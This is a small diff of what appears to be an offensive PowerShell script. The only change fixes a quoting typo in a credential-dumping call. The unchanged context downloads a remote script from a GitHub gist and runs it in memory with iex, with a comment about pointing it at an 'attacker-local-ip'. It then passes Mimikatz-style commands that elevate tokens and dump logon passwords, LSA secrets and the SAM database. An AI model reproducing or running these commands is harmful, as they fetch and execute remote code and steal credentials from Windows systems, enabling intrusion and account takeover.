@@ -46,4 +46,4 @@ $out = 0
 # Change this to "attacker-local-ip" for internal sources
 wget('https://gist.githubusercontent.com/pich4ya/144d32262861b573279d15e653c4e08d/raw/6f019c4e2f1f62ffc0754d01dff745d3cec62057/Invoke-SoHighSoHigh.ps1') -UseBasicParsing|iex
 # Double single quote here is by intention.
-Invoke-SoHighSoHigh -Command '"privile''ge::debug" "token::elevate" "sekurlsa::logonPasswords full" "lsadump::secrets" "lsadump::lsa /patch" "SEKURLSA::Minidump" "lsadump::sam:'
+Invoke-SoHighSoHigh -Command '"privile''ge::debug" "token::elevate" "sekurlsa::logonPasswords full" "lsadump::secrets" "lsadump::lsa /patch" "SEKURLSA::Minidump" "lsadump::sam'
